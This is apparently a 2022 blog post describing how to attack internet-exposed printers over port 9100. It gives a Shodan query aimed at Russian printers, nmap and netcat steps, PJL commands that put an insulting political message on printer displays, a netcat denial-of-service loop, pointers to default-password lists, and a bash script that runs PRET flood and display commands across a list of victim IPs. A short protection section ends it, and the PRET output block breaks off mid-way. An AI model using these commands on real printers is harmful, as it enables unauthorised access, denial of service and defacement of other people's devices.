Everything created by a human can be broken by a human. That's the main rule. The good question - how. 

Every device, that works online is vulnerable. In this article, I would like to describe the old and well-known problem related to printers - port 9100.
<!--more-->

## history

In the early 90 HP introduced an option of a connection to a port 9100/TCP and getting the ability to perform *raw* printing.

This approach uses [CAPS](https://en.wikipedia.org/wiki/CUPS) - **Common UNIX Printing System** that allows a computer to act as a [print server](https://en.wikipedia.org/wiki/Print_server): receive jobs for printing and do some additional operations. 

At the same moment, 9100 is not a printing protocol, instead, data can be sent directly to printing devices like over TCP. This gives great options to receive some info back from the printer - so communication is bidirectional. In addition, this gives us the possibility to use PJL, PostScript, or PCL commands.

The last - is an easy vector for the attacker.

## victims

To find victims u need somehow scan a network and obtain info about the device and open ports. To do so, u can use some service like [shodan.io](shodan.io), [google dorking](https://www.google-dorking.com), [ZoomEye](https://www.zoomeye.org/), [exploit-db](https://www.exploit-db.com), etc.

> **Shodan** is a search engine for Internet-connected devices [source](https://help.shodan.io/the-basics/what-is-shodan)
> 
> **google dorking** - search engine to find problems
> 
> **ZoomEye** - alternative for Shodan
> 
> **exploit-db** - database with problems that were found 

Let's use Shodan. If u type filter like

```
port:9100 pjl country:ru
```

u can get a lot of results:

<div style="text-align:center">
<a href="{{site.baseurl}}/assets/posts/images/2022-03-09-9100/search.png">
<img src="{{site.baseurl}}/assets/posts/images/2022-03-09-9100/search.png" alt="search.png" width="450"/>
</a>
</div>
<br>
<br>

Imagine, that u find a victim - some IP of the printer with opened 9100 port.

## pjl

**PJL** - Printer Job Language, created by HP, as mentioned above in 90th. Later this language was modified, added new functions, and as result created **PCL** - Printer Command Language.

At the same moment, PJL still exists and is widely used. One language used by different providers leads to the existence of many-many different commands.

<div style="text-align:center">
<a href="{{site.baseurl}}/assets/posts/images/2022-03-09-9100/command.png">
<img src="{{site.baseurl}}/assets/posts/images/2022-03-09-9100/command.png" alt="command.png" width="350"/>
</a>
</div>
<br>
<br>

> Here is an official manual with [supported commands by HP for PJL/PCL](https://developers.hp.com/system/files/PJL_Technical_Reference_Manual.pdf)

To change the language of the printer we can use these commands:

```
<ESC>%–12345X@PJL <CR><LF>
@PJL COMMENT ** Beginning PCL Job ** <CR><LF> 
@PJL ENTER LANGUAGE = PCL <CR><LF>
@PJL SET LPARM : PCL SYMSET = DESKTOP <CR><LF>
<ESC>E . . . . PCL job . . . .<ESC>E
```

## jetdirect

HP provide also [JetDirect](https://en.wikipedia.org/wiki/JetDirect) - technology that allows computer printers to be directly attached to a Local Area Network.

Firstly this technology was introduced in 1991 and has the name QuickSilver. Later, it was modified and widely spread in other areas: bt130, psa4250, etc.

JetDirect allows printing something on the printer via network. Not for the owners only ;].

## 9100

Using port 9100 we can send direct `@PJL` commands.

### manual way

**Step 1** - Inspect the target

For this purpose, we can use `nmap`

```
nmap -p 9100 <target>
```

the result can be like this:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-09 11:55 EET
Nmap scan report for pool-<target> (<ip>)
Host is up (0.075s latency).

PORT     STATE SERVICE
9100/TCP open  jetdirect

Nmap done: 1 IP address (1 host up) scanned in 1.27 seconds
```

**Step 2** - Connect to target

For connection we can use `nc`:

```
nc -v <target> 9100
Connection to <target> port 9100 [tcp/hp-pdl-datastr] succeeded!
```

**Step 3** - Send command

The PJL language [reference](https://developers.hp.com/system/files/PJL_Technical_Reference_Manual.pdf) can help us with this.

Example:

```
@PJL STMSG DISPLAY="PUTIN HYILO" 
```

Or:

```
@PJL INFO STATUS
@PJL INFO STATUS
CODE=10001
DISPLAY="PUTIN HUYLO"
ONLINE=TRUE
```

It's good to mention about how this everything works. As always, image better than any explanation:

<div style="text-align:center">
<a href="{{site.baseurl}}/assets/posts/images/2022-03-09-9100/howitworks.png">
<img src="{{site.baseurl}}/assets/posts/images/2022-03-09-9100/howitworks.png" alt="howitworks.png" width="500"/>
</a>
</div>
<br>
<br>

So if u send the command `@PJL` - it will be executed, if not - the sent data will be just printed.

It's possible also to break the printer, even physically ([problem with NVRam](http://hacking-printers.net/wiki/index.php/Physical_damage)).

We can use [DoS attack](https://en.wikipedia.org/wiki/Denial-of-service_attack) attack:

```
while [ 0 -eq 0 ]; do echo "PUTIN HYILO" | nc –v <target>; done
```
### web interface

It's often when the printer has been connected to the internet, it offers a web page with configs. Users often didn't know about it and even did not change the default password.

Here is a web [database with default passwords](http://www.passwordsdatabase.com/vendor/hewlett_packard). 

You can easelly find some printer like this one:

<div style="text-align:center">
<a href="{{site.baseurl}}/assets/posts/images/2022-03-09-9100/printerweb.png">
<img src="{{site.baseurl}}/assets/posts/images/2022-03-09-9100/printerweb.png" alt="printerweb.png" width="400"/>
</a>
</div>
<br>
<br>

Then, u can do whatever u want ;].

### tools

It's also a lot of tools for checking printer config: 

* [www.blackhat.com](https://www.blackhat.com/docs/us-17/thursday/us-17-Mueller-Exploiting-Network-Printers.pdf)
* [Hijetter](http://www.phenoelit.org/hp/docu.html)
* [PRET](https://github.com/RUB-NDS/PRET)

Let's review how to use [PRET](https://github.com/RUB-NDS/PRET).

<div style="text-align:center">
<a href="{{site.baseurl}}/assets/posts/images/2022-03-09-9100/pret.png">
<img src="{{site.baseurl}}/assets/posts/images/2022-03-09-9100/pret.png" alt="pret.png" width="500"/>
</a>
</div>
<br>
<br>

**Step 1:** Download the **PRET**:

```
git clone git@github.com:RUB-NDS/PRET.git
cd PRET
```

**Step 2:** Prepare targets

Create a list of IPs for printers with open port 9100.

**Step 3:** Write automation:

U need to create a postScript document for printing. The easiest way is to save the document as PostScript.

Then, prepare a list of commands u want to execute and put them into file `c.txt`:

```
print print.ps
flood
display PUTIN HUYLO
quit
```

Write script for running and iterating targets:

```
#!/bin/bash
filename=$1
lines=`cat $filename`
for line in $lines; do
        echo "$line"
        python pret.py $line -i c.txt pjl 
        echo done for $line
done
```

**Step 4:** Run

```
bash run.sh victims.txt
```

An example output:

```
% python pret.py <target> pjl --debug
Please install the 'colorama' module for color support.

## protection

If someone wants to break u'r device, he will, anyway, the question is only time ). So the real protection - is to make u'r printer offline.

To increase breaking time u can do these steps:

* secure port 9100 as [described here](https://support.hp.com/us-en/document/c03687861)
* change default passwords on the web interface
* upgrade software constantly
* add a limit to IP address of u'r printer
* turn on a printer only when u need it
